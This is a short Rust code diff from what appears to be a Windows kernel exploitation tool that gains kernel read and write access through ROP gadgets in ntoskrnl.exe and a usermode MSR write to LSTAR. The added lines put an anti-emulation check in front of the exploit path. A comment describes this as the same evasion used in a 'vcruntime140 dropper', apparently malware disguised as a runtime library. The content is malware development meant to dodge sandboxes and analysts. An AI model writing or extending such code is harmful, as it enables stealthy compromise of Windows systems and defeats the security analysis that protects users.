@@ -16,6 +16,10 @@ pub struct KernelRW<'a> {
 
 impl<'a> KernelRW<'a> {
     pub fn setup(dev: &'a Device, pe: &[u8], nt_va: u64) -> Result<Self> {
+        // Second gate (device open already ran one). The distinctive LSTAR + ROP + wrmsr-from-usermode
+        // behavior is now preceded by the same class of anti-emulation math as the vcruntime140 dropper.
+        let _ = crate::obf::pop_quiz();
+
         let gadgets = scan_gadgets_in_pe(pe, nt_va)?;
         if !gadgets.all_found() { bail!("missing ROP gadgets in ntoskrnl.exe"); }
         unsafe {
